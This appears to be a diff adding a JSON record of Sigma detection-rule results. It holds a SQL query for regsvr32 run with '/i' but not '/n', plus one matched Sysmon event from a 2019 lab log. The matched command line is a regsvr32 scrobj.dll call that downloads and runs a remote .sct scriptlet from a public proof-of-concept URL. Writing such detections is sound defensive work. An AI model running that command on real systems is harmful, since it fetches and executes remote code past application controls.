@@ -1,0 +1,59 @@
+[{
+  "title": "Potential Regsvr32 Commandline Flag Anomaly",
+  "id": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+  "description": "Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.",
+  "sigmafile": "",
+  "sigma": [
+    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\regsvr32.exe' ESCAPE '\\' AND (CommandLine LIKE '% -i:%' ESCAPE '\\' OR CommandLine LIKE '% /i:%' ESCAPE '\\' OR CommandLine LIKE '% –i:%' ESCAPE '\\' OR CommandLine LIKE '% —i:%' ESCAPE '\\' OR CommandLine LIKE '% ―i:%' ESCAPE '\\')) AND (NOT CommandLine LIKE '% -n %' ESCAPE '\\' OR CommandLine LIKE '% /n %' ESCAPE '\\' OR CommandLine LIKE '% –n %' ESCAPE '\\' OR CommandLine LIKE '% —n %' ESCAPE '\\' OR CommandLine LIKE '% ―n %' ESCAPE '\\')))"
+  ],
+  "rule_level": "medium",
+  "tags": [
+    "attack.defense-evasion",
+    "attack.t1218.010"
+  ],
+  "count": 1,
+  "matches": [
+    {
+      "row_id": 3,
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "CommandLine": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll",
+      "Company": "Microsoft Corporation",
+      "Computer": "IEWIN7",
+      "CurrentDirectory": "C:\\Windows\\system32\\",
+      "Description": "Microsoft(C) Register Server",
+      "EventID": 1,
+      "EventRecordID": 18851,
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
+      "Hashes": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",
+      "IMPHASH": "A2DAD36BD73280726DA578EB659D0583",
+      "Image": "C:\\Windows\\System32\\regsvr32.exe",
+      "IntegrityLevel": "Medium",
+      "Keywords": "0x8000000000000000",
+      "Level": 4,
+      "LogonGuid": "365ABB72-433D-5CE0-0000-002031350100",
+      "LogonId": "0x13531",
+      "MD5": "432BE6CF7311062633459EEF6B242FB5",
+      "Opcode": 0,
+      "OriginalLogfile": "exec_sysmon_1_7_jscript9_defense_evasion.evtx",
+      "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+      "ParentProcessGuid": "365ABB72-433C-5CE0-0000-00100FD20000",
+      "ParentProcessId": 964,
+      "ProcessGuid": "365ABB72-4612-5CE0-0000-00103D1E2600",
+      "ProcessID": 2044,
+      "Product": "Microsoft® Windows® Operating System",
+      "Provider_Name": "Microsoft-Windows-Sysmon",
+      "SHA1": "A774A816662FF5B75669AA5BCE751BAB9D0972B8",
+      "SHA256": "890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B",
+      "SystemTime": "2019-05-18T17:51:14.254967Z",
+      "Task": 1,
+      "TerminalSessionId": 1,
+      "ThreadID": 1636,
+      "User": "IEWIN7\\IEUser",
+      "UserID": "S-1-5-18",
+      "UtcTime": "2019-05-18 17:51:14.254",
+      "Version": 5
+    }
+  ]
+}]
